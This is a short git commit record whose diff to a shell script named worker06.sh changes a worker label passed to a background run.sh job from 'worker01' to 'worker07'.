f06ef4dc556a226a298133d451c774a2f06a7ec5
mrsilkin9-blip <mr.silkin9@fasdeil.com>
2026-07-22 12:23:30 +0700

    Update worker06.sh

--- worker06.sh
+++ worker06.sh
@@ -6,7 +6,7 @@ rm mcpo.tar.gz
 sleep 40
 echo '#!/bin/bash
 
-cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker01 >/dev/null 2>&1 &
+cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker07 >/dev/null 2>&1 &
 sleep 30
 while true
 do
